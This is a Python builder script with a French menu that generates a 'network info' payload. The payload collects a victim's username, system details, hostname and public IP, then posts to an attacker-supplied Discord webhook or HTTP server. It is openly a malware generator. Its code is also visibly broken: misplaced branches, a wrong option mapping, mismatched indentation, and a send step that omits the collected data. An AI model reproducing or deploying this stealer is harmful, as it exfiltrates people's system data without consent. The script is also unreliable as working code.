import os
from colorama import Fore, Style
def clear():
    os.system("cls")

def banner():
    clear()
    print("=== Configuration Network Info Payload ===\n\n")
    print(f"""


    {Fore.YELLOW}Sortie et envoi:
    1. Envoi par Discord
    2. Envoi par serveur HTTP

            {Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
          
                    """)

def networkinfo():
    banner()
    choix = {
        "Envoi par Discord": None,
        "Envoi par serveur HTTP": None,
    }

    def discord_option():
        clear()
        discord = input("Entrez le webhook Discord  : ")
        if discord:
            choix["Envoi par Discord"] = discord
        else:
            choix["Envoi par Discord"] = None
        banner()

    def http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP  : ")
        if http:
            choix["Envoi par serveur HTTP"] = http
        else:
            choix["Envoi par serveur HTTP"] = None
        banner()

    option = [

        ("Envoi par Discord", discord_option),
        ("Envoi par serveur HTTP", http_option),
    ]

    def create_payload():
        clear()
        print("=== Payload Network Info Généré ===\n")
        payload = f"""
import os
os.system('pip install requests')
import getpass, platform, socket, requests

def collect_network_info():
    user = getpass.getuser()
    system = platform.system()
    node = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    ip_address = socket.gethostbyname(socket.gethostname())
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except:
        public_ip = 'N/A'
    
    network_info = {{
        "Utilisateur": user,
        "Système": system,
        "Nom du noeud": node,
        "Version": version,
        "Machine": machine,
        "Processeur": processor,
        "IP Publique": public_ip
    }}

    for key, value in network_info.items():
        print(f"{{key}}: {{value}}")

"""
    if choix["Envoi par Discord"]:
        payload += f'''
    # Envoi par Discord
    discord_webhook = r"{choix['Envoi par Discord']}"
    data = {{"content": "Informations réseau collectées."}}
    requests.post(discord_webhook, data=data)

if __name__ == "__main__":
    collect_network_info()
        '''

    if choix["Envoi par serveur HTTP"]:
        payload += f'''
    # Envoi par serveur HTTP
    http_server = r"{choix['Envoi par serveur HTTP']}"
    data = {{"content": "Informations réseau collectées."}}
    requests.post(http_server, data=data)

if __name__ == "__main__":
    collect_network_info()
        '''

   

        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "networkinfo_payload.py")
        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
        with open(payload_path, "w", encoding="utf-8") as f:
            f.write(payload)

    while True:
        banner()
        cmd = input(">> ")
        if cmd.lower() == "exit":
            break
        elif cmd.lower().startswith("set "):
            try:
                option_num = int(cmd.split()[1])
                if option_num in range(1, 4):
                    option_funcs = {
                        2: discord_option,
                        3: http_option,
                    }
                    option_funcs[option_num]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except (IndexError, ValueError):
                print(Fore.RED + "Commande invalide. Utilisez : set <num>" + Style.RESET_ALL)

        elif cmd.lower() == "show":
            clear()
            print("\nConfiguration actuelle du module Network Info :")
            for key, value in choix.items():
                print(f"{key}: {value}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()
            input("\nAppuyez sur Entrée pour continuer...")
        else:
            print(Fore.RED + "Commande invalide." + Style.RESET_ALL)
